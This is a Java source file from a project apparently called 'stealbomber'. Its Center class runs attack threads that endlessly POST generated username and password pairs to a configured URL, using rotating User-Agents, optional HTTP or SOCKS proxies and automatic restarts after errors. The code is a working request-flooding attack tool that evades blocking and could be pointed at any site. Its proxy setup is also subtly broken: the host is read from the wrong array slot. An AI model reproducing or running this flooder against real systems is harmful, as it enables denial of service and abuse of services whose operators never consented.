package stealbomber.attack;

import java.io.IOException;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.InetSocketAddress;
import java.net.MalformedURLException;
import java.net.Proxy;
import java.net.URL;
import java.util.concurrent.ThreadLocalRandom;

import stealbomber.manage.GetFile;
import stealbomber.manage.Storage;
import stealbomber.manage.ThreadControl;

/**
 * 攻击线程和主要方法
 * 
 * @author ObcbO
 */
public class Center implements Runnable {
    private static ThreadControl ThreadControl = new ThreadControl("AttackGroup-Main");
    /** 错误次数 */
    private static int error = 0;
    /** final长度 */
    private static final int UAL;

    private static String ptype;// 代理类型
    private static String phost;// 代理host
    private static int pport;// 代理端口

    private static URL url;

    static {// 初始化
        UAL = Storage.UA.length;

        // 设置攻击网址
        try {
            url = new URL(GetFile.url);
        } catch (MalformedURLException e) {
            e.printStackTrace();
        }

        // proxy
        if (GetFile.proxyswitch) {
            String[] proxy = AckProxy.dispose();
            ptype = proxy[0];
            phost = proxy[0];
            pport = Integer.valueOf(proxy[2]);
        } else {
            ptype = phost = null;
            pport = 0;
        }
    }

    public static void start() {
        ThreadControl.start();
    }

    public void run() {
        while (ThreadControl.state()) {
            go(UserName.get(), Password.get());
        }
    }

    private static void go(String name, String pass) {
        HttpURLConnection urlConn = null;
        try {
            if (GetFile.proxyswitch) {
                if ("http".equals(ptype)) {
                    Proxy lp = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(phost, pport));
                    urlConn = (HttpURLConnection) url.openConnection(lp);
                } else if ("socks".equals(ptype)) {
                    Proxy lp = new Proxy(Proxy.Type.SOCKS, new InetSocketAddress(phost, pport));
                    urlConn = (HttpURLConnection) url.openConnection(lp);
                }
            } else {
                urlConn = (HttpURLConnection) url.openConnection();
            }
            urlConn.setRequestMethod("POST");
            // 超时时间
            urlConn.setConnectTimeout(3000);
            // 设置是否输出
            urlConn.setDoOutput(true);
            // 设置是否读入
            urlConn.setDoInput(true);
            // 设置是否使用缓存
            urlConn.setUseCaches(false);
            // 设置此 HttpURLConnection 实例是否应该自动执行 HTTP 重定向
            urlConn.setInstanceFollowRedirects(false);
            // 设置请求头
            urlConn.setRequestProperty("Content-Length", "40");
            urlConn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            urlConn.setRequestProperty("User-Agent", Storage.UA[ThreadLocalRandom.current().nextInt(UAL)]);
            // 连接
            urlConn.connect();
            // 写入参数到请求中
            String param = GetFile.param.replace("$[account]", name);
            param = param.replace("$[password]", pass);

            try (OutputStream out = urlConn.getOutputStream()) {
                out.write(param.getBytes());
                // 输出
                if (GetFile.gps) {
                    System.out.println(name + " " + pass);
                }
                out.flush();
            }
        } catch (IOException e) {
            if (GetFile.gpr) {
                System.out.println("转发出错，错误信息：" + e.getLocalizedMessage() + ";" + e.getClass());
            }
            if (error >= 100) {
                error = 0;
                ThreadControl.stop();
                new Thread(() -> {
                    System.gc();
                    if (GetFile.gpr) {
                        System.out.println("\n错误次数过多, 正在重新启动 10s\n");
                    }
                    try {
                        Thread.sleep(GetFile.restart);// 1000ms=1s
                    } catch (InterruptedException e1) {
                        Thread.currentThread().interrupt();
                    }
                    ThreadControl.start();
                }, "ReloadThread").start();
            } else if (!"Connect timed out".equals(e.getLocalizedMessage())) {
                error = error + 5;
            } else if ("Connect timed out".equals(e.getLocalizedMessage())) {
                error++;
            }
        } finally {
            if (null != urlConn) {
                try {
                    urlConn.disconnect();
                } catch (Exception e) {
                    System.out.println("httpURLConnection 流关闭异常：" + e.getLocalizedMessage());
                }
            }
        }
    }
}